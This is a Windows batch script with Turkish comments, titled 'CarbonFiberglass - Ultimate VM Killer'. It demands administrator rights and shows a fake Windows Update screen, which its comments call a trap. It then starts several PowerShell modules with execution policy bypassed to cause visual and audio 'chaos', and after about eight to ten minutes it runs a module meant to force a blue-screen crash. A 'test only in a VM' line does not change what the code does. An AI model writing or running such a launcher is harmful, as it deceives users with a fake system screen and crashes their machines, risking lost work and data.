@echo off
title CarbonFiberglass - Ultimate VM Killer
color 0c
cls

:: ============================================================
:: YÖNETİCİ YETKİSİ KONTROLÜ
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ============================================================
    echo   YONETICI YETKISI GEREKLI!
    echo   Dosyaya sag tiklayip "Yonetici olarak calistir" secin.
    echo ============================================================
    pause >nul
    exit
)

:: ============================================================
:: GEREKSİZ DOSYA KONTROLÜ
:: ============================================================
if not exist "modul_hata_yonetimi.ps1" (
    echo HATA: modul_hata_yonetimi.ps1 eksik!
    pause >nul
    exit
)

:: ============================================================
:: BAŞLANGIÇ ANİMASYONU (Yükleniyor)
:: ============================================================
cls
echo ============================================================
echo   ☢️  CARBONFIBERGLASS YUKLENIYOR  ☢️
echo ============================================================
ping 127.0.0.1 -n 2 >nul
echo   ■□□□□□□□□□ %%10
ping 127.0.0.1 -n 1 >nul
echo   ■■□□□□□□□□ %%20
ping 127.0.0.1 -n 1 >nul
echo   ■■■□□□□□□□ %%30
ping 127.0.0.1 -n 1 >nul
echo   ■■■■□□□□□□ %%40
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■□□□□□ %%50
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■■□□□□ %%60
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■■■□□□ %%70
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■■■■□□ %%80
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■■■■■□ %%90
ping 127.0.0.1 -n 1 >nul
echo   ■■■■■■■■■■ %%100
ping 127.0.0.1 -n 1 >nul

:: ============================================================
:: SAHTE WINDOWS GÜNCELLEME EKRANI
:: ============================================================
cls
echo ============================================================
echo   Windows Update
echo ============================================================
echo   %random%%random%%random%%random% islem tamamlandi.
echo   Bilgisayarinizi kapatmayin.
echo ============================================================
ping 127.0.0.1 -n 3 >nul

:: ============================================================
:: ANA MESAJ
:: ============================================================
cls
echo ============================================================
echo   ☢️  CARBONFIBERGLASS ACTIVATED  ☢️
echo ============================================================
echo   Gorsel solen + Muzik (50-100 Hz ses sabit)
echo   Hata yonetimi + Log + Kendi kendini tamir
echo   Windows Update tuzağı aktif
echo   Sadece VM icinde test edin!
echo ============================================================
echo.
echo   Press any key to start chaos...
pause >nul

:: ============================================================
:: TÜM MODÜLLERİ BAŞLAT
:: ============================================================
start /b powershell -ExecutionPolicy Bypass -File modul_kendi_kendini_tamir.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_log.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_ciddi_hata.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_hata_yonetimi.ps1

:: SÜRE (8-10 DAKİKA)
set /a SURE=%random% %% 120 + 480
echo ============================================================
echo   ☢️ CHAOS ACTIVATED ☢️
echo   Duration: %SURE% seconds
echo   Log: C:\CarbonFiberglass_Log.txt
echo ============================================================
timeout /t %SURE% /nobreak >nul

:: BSOD TETİKLE
start /b powershell -ExecutionPolicy Bypass -File modul_bsod.ps1

:: BİTİŞ
cls
echo ============================================================
echo   ☢️ VM KILLED ☢️
echo   Log: C:\CarbonFiberglass_Log.txt
echo   Tamir logu: C:\CarbonFiberglass_TamirLog.txt
echo ============================================================
pause >nul